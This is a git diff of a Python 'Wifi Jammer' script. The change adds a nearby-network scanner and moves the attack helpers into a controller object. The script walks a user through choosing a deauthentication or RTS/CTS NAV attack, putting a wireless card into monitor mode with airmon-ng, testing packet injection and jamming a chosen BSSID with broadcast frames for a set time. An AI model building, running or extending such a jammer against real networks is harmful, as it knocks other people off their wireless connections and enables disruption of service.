@@ -1,7 +1,26 @@
-import sys
+import sys, subprocess, time, os
+from wireless import Wireless
+from wifi import Cell
 sys.path.append("..")
 from controller.controller import Controller
-from libraries.utils import *
+
+FNULL = open(os.devnull, 'w')
+
+def network_scan():
+    wifi_card = Wireless()
+    interface = wifi_card.interface()
+    wifi_collect = Cell.all(interface)
+    print ("Available networks scan in progress ...")
+    print ("#" * 40)
+    time.sleep(0.5)
+    for wi in wifi_collect:
+        print("SSID: " + wi.ssid)
+        print("BSSID: " + wi.address)
+        print("Channel: " + str(wi.channel))
+        #print("Quality: " + str(wi.quality))
+        print("+-" * 10)
+        time.sleep(0.5)
+    print ("#" * 40)
 
 if __name__ == "__main__":
 
@@ -9,7 +28,7 @@ if __name__ == "__main__":
 
     print("\n")
 
-    show("Wifi jammer")
+    subprocess.call('figlet {}'.format("Wifi Jammer"), shell=True)
 
     time.sleep(0.5)
 
@@ -21,9 +40,9 @@ if __name__ == "__main__":
 
     while attack != "Deauthentication" and attack != "RTS/CTS NAV" and attack != "selective RTS/CTS NAV":
         attack = input("Tell me the attack that you want to do:"
-            "\n -Deauthentication"
-            "\n -RTS/CTS NAV"
-            "\n -selective RTS/CTS NAV"
+            "\n - Deauthentication"
+            "\n - RTS/CTS NAV"
+            "\n - selective RTS/CTS NAV"
             "\n : ")
 
     print("\n")
@@ -39,14 +58,14 @@ if __name__ == "__main__":
 
     channel = input("Tell me the channel of the network that you want to jam:\n")
 
-    clear()
+    ctl.clear()
 
     #call airmon-ng to show to the user a list of available network cards on their device
     subprocess.call('airmon-ng', shell=True)
 
     monitor_card = input('Enter the name of the network card you want to put in monitor mode: ')
 
-    clear()
+    ctl.clear()
 
     #print('#' * 40)
     #print('Killing conflictive processes before put the card in monitor mode.')
@@ -56,16 +75,16 @@ if __name__ == "__main__":
     print('#' * 40)
     time.sleep(2)
     #Start monitor mode on the selected device
-    monitor_mode(monitor_card, channel)
+    ctl.monitor_mode(monitor_card, channel)
 
-    clear()
+    ctl.clear()
 
     #call airmon-ng to show to the user a list of available network cards on their device
-    subprocess.call('airmon-ng', shell=True)
+    #subprocess.call('airmon-ng', shell=True)
 
-    monitor_card = input('Enter the name of the network card you wish to use: ')
+    #monitor_card = input('Enter the name of the network card you wish to use: ')
 
-    clear()
+    #ctl.clear()
 
     client = 'FF:FF:FF:FF:FF:FF'
 
@@ -73,7 +92,7 @@ if __name__ == "__main__":
 
         time = input('Please enter the time you want to jam the network in minutes. You will be able to stop it pressing crtl + c. ')
 
-        packets = calcule_paquets(attack, time)
+        packets = ctl.calcule_paquets(attack, time)
 
         if attack == 'Deauthentication':
             try:
@@ -88,20 +107,20 @@ if __name__ == "__main__":
             subtype = ""
             while subtype != "RTS" and subtype != "CTS":
                 subtype = input("Please tell me what king of attack do you want to do:"
-                    "\n -RTS"
-                    "\n -CTS"
+                    "\n - RTS"
+                    "\n - CTS"
                     "\n : ")
 
-    card_mac = get_mac(monitor_card)
+    card_mac = ctl.get_mac(monitor_card)
 
     card_mac = card_mac.lower()
 
-    clear()
+    ctl.clear()
 
     print("Testing your card, wait a moment. You can stop it doing ctrl + c.")
-    injection_test(bssid, monitor_card)
+    ctl.injection_test(bssid, monitor_card)
 
-    clear()
+    ctl.clear()
 
     print("Jamming network: " + bssid + " through: " + monitor_card)
 
